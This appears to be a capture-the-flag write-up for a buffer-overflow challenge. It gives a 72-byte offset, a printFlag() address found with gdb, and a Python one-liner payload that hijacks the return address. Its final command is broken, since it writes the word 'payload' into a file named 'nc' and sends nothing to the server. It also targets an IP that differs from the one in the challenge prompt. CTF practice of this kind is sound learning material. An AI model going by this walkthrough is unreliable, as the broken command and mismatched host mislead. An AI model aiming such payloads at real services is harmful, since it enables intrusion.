# BOF
## Pwn

> Is the key the key?
>
> nc 159.89.194.7 1342

### Files
- bofez

### Analysis
The file provided is a linux binary for participants to test locally
The challenge name suggests that they should attempt a Buffer Overflow exploit.

### Solution
1. Finding the offset
   ```console
   root@mctf:~$ ./bofez
   ```
   Spam "A"s as input until there is a segmentation fault<br />
   In this challenge, the offset was 72
2. Finding the flag
   Upon disassembling the binary, the printFlag() function can be seen<br />
   ```console
   root@mctf:~$ gdb bofez
   ```
   To find the memory address of the printFlag() function, use ```info functions```<br />
   > printFlag() : 0x401192
3. Convert the memory address
   Convert the hexadecimal memory address to Little-Endian format<br />
   > \x92\x11\x40
4. Crafting the payload
   With the offset and memory address of the printFlag() function, craft the payload<br />
   ```console
   root@mctf:~$ python -c "print 'A' * 72 + '\x92\x11\x40'" > payload
   ```
   ```console
   root@mctf:~$ echo payload > nc 128.199.77.173 1342
   ```
